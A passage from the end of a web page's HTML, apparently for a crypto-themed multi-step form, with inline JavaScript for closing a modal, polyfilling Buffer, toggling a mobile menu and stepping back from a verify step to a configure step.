                    <button onclick="this.parentElement.parentElement.parentElement.remove()" 
                            class="bg-gradient-to-r from-purple-600 to-green-500 hover:from-purple-700 hover:to-green-600 px-6 py-3 rounded-xl font-medium transition-all duration-300 sol-glow w-full">
                        Close
                    </button>
                </div>
            </div>
        `;
        
        document.body.appendChild(modal);
        
        // Trigger animations
        requestAnimationFrame(() => {
            modal.style.opacity = '1';
            modal.firstElementChild.style.transform = 'scale(1)';
        });
    }
    </script>

    <!-- Buffer Definition Script -->
    <script>
        // Add this before using any Buffer operations
        if (typeof Buffer === 'undefined') {
            window.Buffer = buffer.Buffer;
        }
    </script>

    <script>
    function toggleMobileMenu() {
        const mobileMenu = document.getElementById('mobileMenu');
        const isHidden = mobileMenu.classList.contains('hidden');
        
        if (isHidden) {
            mobileMenu.classList.remove('hidden');
            requestAnimationFrame(() => {
                mobileMenu.style.opacity = '1';
                mobileMenu.style.transform = 'translateY(0)';
            });
        } else {
            mobileMenu.style.opacity = '0';
            mobileMenu.style.transform = 'translateY(-1rem)';
            setTimeout(() => {
                mobileMenu.classList.add('hidden');
            }, 300);
        }
    }
    </script>

    <script>
    // Update the goBack function
    function goBack() {
        const configureStep = document.querySelector('form').parentElement.parentElement;
        const verifyStep = document.getElementById('verifyStep');
        
        // Hide verify step and show configure step
        verifyStep.classList.add('hidden');
        configureStep.classList.remove('hidden');
        
        // Update progress indicator
        updateProgress(1);
        
        // Scroll to top smoothly
        window.scrollTo({ top: 0, behavior: 'smooth' });
    }
    </script>
</body>
</html>
